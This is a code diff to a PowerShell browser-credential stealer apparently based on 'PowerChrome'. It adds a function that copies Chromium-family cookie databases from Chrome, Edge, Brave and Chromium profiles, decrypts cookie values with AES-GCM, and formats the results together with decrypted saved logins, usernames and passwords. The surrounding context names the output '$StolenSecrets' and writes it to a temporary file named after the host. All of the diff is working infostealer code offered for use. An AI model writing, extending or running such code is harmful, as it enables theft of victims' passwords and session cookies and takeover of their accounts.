@@ -636,10 +636,14 @@ function Get-ChromiumLoginBlobs {
     $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))
 
     try {
-        Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
+        $FileStream = New-Object System.IO.FileStream($LoginDataPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $FileOut = New-Object System.IO.FileStream($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
+        $FileStream.CopyTo($FileOut)
+        $FileOut.Close()
+        $FileStream.Close()
     }
     catch {
-        return "[-] Unable to copy database file from $LoginDataPath"
+        return "[-] Unable to copy database file from $LoginDataPath : $($_.Exception.Message)"
     }
 
     $DatabasePointer    = [IntPtr]::Zero
@@ -718,6 +722,100 @@ function Get-ChromiumLoginBlobs {
     return $LoginResults
 }
 
+# ======================================================================
+# Get-ChromiumCookieBlobs
+# ======================================================================
+
+function Get-ChromiumCookieBlobs {
+    param([string]$Browser)
+
+    switch ($Browser.ToLower()) {
+        "cft"       { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default" }
+        "chrome"    { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"             }
+        "edge"      { $BaseDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default"           }
+        "brave"     { $BaseDir = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default" }
+        "chromium"  { $BaseDir = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default"                 }
+        default     { return $false }
+    }
+
+    $CookiePaths = @(
+        (Join-Path $BaseDir "Network\Cookies"),
+        (Join-Path $BaseDir "Cookies")
+    )
+
+    $CookiePath = $null
+    foreach ($Path in $CookiePaths) {
+        if (Test-Path -Path $Path) {
+            $CookiePath = $Path
+            break
+        }
+    }
+
+    if (-not $CookiePath) { return $false }
+
+    [int]$SqliteOk              = 0
+    [int]$SqliteRow             = 100
+    [int]$SqliteOpenReadOnly    = 1
+    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))
+
+    try {
+        $FileStream = New-Object System.IO.FileStream($CookiePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $FileOut = New-Object System.IO.FileStream($TempDatabasePath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
+        $FileStream.CopyTo($FileOut)
+        $FileOut.Close()
+        $FileStream.Close()
+    }
+    catch {
+        Write-Output "[-] Cookie copy error: $($_.Exception.Message)"
+        return $false
+    }
+
+    $DatabasePointer    = [IntPtr]::Zero
+    $StatementPointer   = [IntPtr]::Zero
+    $CookieSqlQuery     = 'SELECT host_key, name, path, encrypted_value FROM cookies'
+
+    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
+    if ($ResultCode -ne $SqliteOk) { return $false }
+
+    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $CookieSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
+    if ($ResultCode -ne $SqliteOk) { return $false }
+
+    $CookieResults = @()
+    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
+        $HostKeyPointer     = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
+        $NamePointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
+        $PathPointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
+        $EncryptedPointer   = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
+        $EncryptedSize      = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
+
+        $HostKey    = if ($HostKeyPointer   -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostKeyPointer)   } else { "" }
+        $Name       = if ($NamePointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePointer)      } else { "" }
+        $Path       = if ($PathPointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPointer)      } else { "" }
+
+        $RawEncryptedData = @()
+        if ($EncryptedSize -gt 0 -and $EncryptedPointer -ne [IntPtr]::Zero) {
+            $RawEncryptedData = New-Object byte[] $EncryptedSize
+            [Runtime.InteropServices.Marshal]::Copy($EncryptedPointer, $RawEncryptedData, 0, $EncryptedSize)
+        }
+
+        if ($RawEncryptedData.Length -eq 0) { continue }
+
+        $CookieResults += [PSCustomObject]@{
+            Host                    = $HostKey
+            Name                    = $Name
+            Path                    = $Path
+            Base64EncryptedValue    = [Convert]::ToBase64String($RawEncryptedData)
+        }
+    }
+
+    if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
+    if ($DatabasePointer -ne [IntPtr]::Zero)  { [void]$Sqlite3Close.Invoke($DatabasePointer)    }
+
+    Start-Sleep -Milliseconds 500
+    Remove-Item -Path $TempDatabasePath -Force
+
+    return $CookieResults
+}
 
 # ======================================================================
 # Invoke-PowerChrome (Main Function)
@@ -915,20 +1013,88 @@ if (-not ($Browser)){
     }
 }
 
-    if ($LoginDataResults.Count -gt 0) {
-        if ($Verbose) { Write-Output "" }
-        Write-Output "[+] Decrypted Credentials"
-        $LoginDataResults | Sort-Object Target, Username | Format-Table -AutoSize
+    # ------------------------------------------------------------------
+    # DECRYPT COOKIES
+    # ------------------------------------------------------------------
+    Log "Collecting Cookies..."
+    $CookieData = Get-ChromiumCookieBlobs -Browser $Browser
+    $CookieResults = @()
+
+    if ($CookieData) {
+        foreach ($Record in $CookieData) {
+            [int]$BlockSize = 16
+            [int]$NonceSize = 12
+            $Raw = [Convert]::FromBase64String($Record.Base64EncryptedValue)
+            if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
+
+            $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
+            switch ($Header) {
+                'v10' { $Key = $MasterKey; $Offset = 3 }
+                'v20' { $Key = $MasterKey; $Offset = 3 }
+                default { continue }
+            }
+
+            try {
+                $Nonce      = $Raw[$Offset..($Offset + $NonceSize - 1)]
+                $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
+                $Tag        = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
+
+                $Plain   = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
+                $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
+
+                $CookieResults += [PSCustomObject]@{
+                    Host  = $Record.Host
+                    Name  = $Record.Name
+                    Value = $Decoded
+                    Path  = $Record.Path
+                }
+            }
+            catch { }
+        }
+    }
+
+    # Return results as a hashtable to reliably extract at caller level
+    return @{
+        Logins  = $LoginDataResults
+        Cookies = $CookieResults
     }
 
 }
 # 1. Trigger the function with a valid browser name (Chrome, Edge, or Chromium)
-$StolenSecrets = Invoke-PowerChrome -Browser Chrome -HideBanner
+$Output = Invoke-PowerChrome -Browser Chrome -HideBanner
+
+# Filter for the hashtable we explicitly returned, ignoring pipeline string output pollution
+$Secrets = $Output | Where-Object { $_ -is [hashtable] } | Select-Object -Last 1
 
 # 2. Check if we found any data
-if ($StolenSecrets) {
+if ($Secrets -and ($Secrets.Logins.Count -gt 0 -or $Secrets.Cookies.Count -gt 0)) {
     # Convert the object results to a readable string
-    $CleanOutput = $StolenSecrets | Out-String
+    $OutputString = New-Object System.Text.StringBuilder
+    
+    if ($Secrets.Logins.Count -gt 0) {
+        [void]$OutputString.AppendLine("========================================")
+        [void]$OutputString.AppendLine("LOGIN CREDENTIALS")
+        [void]$OutputString.AppendLine("========================================")
+        foreach ($Login in $Secrets.Logins) {
+            [void]$OutputString.AppendLine("URL      : $($Login.Target)")
+            [void]$OutputString.AppendLine("USERNAME : $($Login.Username)")
+            [void]$OutputString.AppendLine("PASSWORD : $($Login.Password)`n")
+        }
+    }
+
+    if ($Secrets.Cookies.Count -gt 0) {
+        [void]$OutputString.AppendLine("`n========================================")
+        [void]$OutputString.AppendLine("BROWSER COOKIES")
+        [void]$OutputString.AppendLine("========================================")
+        foreach ($Cookie in $Secrets.Cookies) {
+            [void]$OutputString.AppendLine("HOST  : $($Cookie.Host)")
+            [void]$OutputString.AppendLine("NAME  : $($Cookie.Name)")
+            [void]$OutputString.AppendLine("VALUE : $($Cookie.Value)")
+            [void]$OutputString.AppendLine("PATH  : $($Cookie.Path)`n")
+        }
+    }
+
+    $CleanOutput = $OutputString.ToString()
     
     # 3. Create a temporary file to hold the results
     $HostName = $env:COMPUTERNAME
@@ -988,6 +1154,5 @@ if ($StolenSecrets) {
     }
 }
 else {
-    Write-Host "No passwords were found on this machine." -ForegroundColor Yellow
+    Write-Host "No passwords or cookies were found on this machine." -ForegroundColor Yellow
 }
-
